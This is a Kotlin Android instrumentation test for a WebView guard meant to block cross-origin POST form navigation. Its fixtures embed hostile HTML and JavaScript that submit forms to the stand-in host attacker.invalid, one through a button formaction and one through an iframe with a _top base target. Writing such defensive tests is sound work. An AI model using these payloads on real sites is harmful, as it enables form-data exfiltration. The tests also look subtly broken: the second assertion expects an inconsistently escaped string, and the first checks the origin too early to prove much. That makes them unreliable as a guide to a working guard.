package com.example

import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.test.ext.junit.runners.AndroidJUnit4
import androidx.test.platform.app.InstrumentationRegistry
import androidx.webkit.WebViewCompat
import androidx.webkit.WebViewFeature
import com.example.core.security.buildMainFrameFormOriginGuard
import org.junit.Assert.assertEquals
import org.junit.Assert.assertTrue
import org.junit.Assume.assumeTrue
import org.junit.Test
import org.junit.runner.RunWith
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicReference

@RunWith(AndroidJUnit4::class)
class SafeWebViewPostOriginGuardTest {

    @Test
    fun crossOriginPostFormCannotNavigateTheTopLevelDocument() {
        assumeTrue(
            "The emulator WebView must support document-start JavaScript.",
            WebViewFeature.isFeatureSupported(WebViewFeature.DOCUMENT_START_SCRIPT)
        )

        val instrumentation = InstrumentationRegistry.getInstrumentation()
        val context = instrumentation.targetContext
        val completed = CountDownLatch(1)
        val result = AtomicReference<String?>(null)
        lateinit var webView: WebView

        instrumentation.runOnMainSync {
            webView = WebView(context).apply {
                settings.javaScriptEnabled = true
                WebViewCompat.addDocumentStartJavaScript(
                    this,
                    buildMainFrameFormOriginGuard("https://sitebin.test/"),
                    setOf("*")
                )
                webViewClient = object : WebViewClient() {
                    override fun onPageFinished(view: WebView?, url: String?) {
                        view?.evaluateJavascript(
                            "location.origin + '|' + " +
                                "document.body.getAttribute('data-post-attempted') + '|' + " +
                                "document.body.getAttribute('data-origin-after-submit')"
                        ) { value ->
                            result.set(value)
                            completed.countDown()
                        }
                    }
                }

                val html = """
                    <!doctype html>
                    <html>
                    <head><meta charset="utf-8"></head>
                    <body>
                    <script>
                        const form = document.createElement('form');
                        form.method = 'POST';
                        form.action = 'https://sitebin.test/allowed';
                        const submitter = document.createElement('button');
                        submitter.type = 'submit';
                        submitter.setAttribute('formaction', 'https://attacker.invalid/collect');
                        submitter.textContent = 'submit';
                        form.appendChild(submitter);
                        document.body.appendChild(form);
                        document.body.setAttribute('data-post-attempted', 'true');
                        submitter.click();
                        document.body.setAttribute('data-origin-after-submit', location.origin);
                    </script>
                    </body>
                    </html>
                """.trimIndent()

                loadDataWithBaseURL(
                    "https://sitebin.test/",
                    html,
                    "text/html",
                    "UTF-8",
                    null
                )
            }
        }

        try {
            assertTrue("WebView did not finish the local test page.", completed.await(10, TimeUnit.SECONDS))
            assertEquals(
                "\"https://sitebin.test|true|https://sitebin.test\"",
                result.get()
            )
        } finally {
            instrumentation.runOnMainSync {
                webView.stopLoading()
                webView.destroy()
            }
        }
    }

    @Test
    fun iframeBaseTargetCannotOverrideTheValidatedTopLevelOrigin() {
        assumeTrue(
            "The emulator WebView must support document-start JavaScript.",
            WebViewFeature.isFeatureSupported(WebViewFeature.DOCUMENT_START_SCRIPT)
        )

        val instrumentation = InstrumentationRegistry.getInstrumentation()
        val context = instrumentation.targetContext
        val completed = CountDownLatch(1)
        val result = AtomicReference<String?>(null)
        lateinit var webView: WebView

        instrumentation.runOnMainSync {
            webView = WebView(context).apply {
                settings.javaScriptEnabled = true
                WebViewCompat.addDocumentStartJavaScript(
                    this,
                    buildMainFrameFormOriginGuard("https://sitebin.test/"),
                    setOf("*")
                )
                webViewClient = object : WebViewClient() {
                    override fun onPageFinished(view: WebView?, url: String?) {
                        view?.evaluateJavascript(
                            """
                            (function () {
                                const frame = document.createElement('iframe');
                                frame.srcdoc = '<base target="_top"><form id="f" method="POST" action="https://attacker.invalid/collect"></form><script>document.getElementById("f").submit();<\/script>';
                                document.body.appendChild(frame);
                                return true;
                            })();
                            """.trimIndent()
                        ) {
                            view.postDelayed({
                                view.evaluateJavascript("window.location.href") { currentUrl ->
                                    result.set(currentUrl)
                                    completed.countDown()
                                }
                            }, 750L)
                        }
                    }
                }
                loadDataWithBaseURL(
                    "https://sitebin.test/",
                    "<!doctype html><html><head></head><body></body></html>",
                    "text/html",
                    "UTF-8",
                    null
                )
            }
        }

        try {
            assertTrue("WebView did not finish the base-target test page.", completed.await(10, TimeUnit.SECONDS))
            assertEquals("\\\"https://sitebin.test/\\\"", result.get())
        } finally {
            instrumentation.runOnMainSync {
                webView.stopLoading()
                webView.destroy()
            }
        }
    }

}
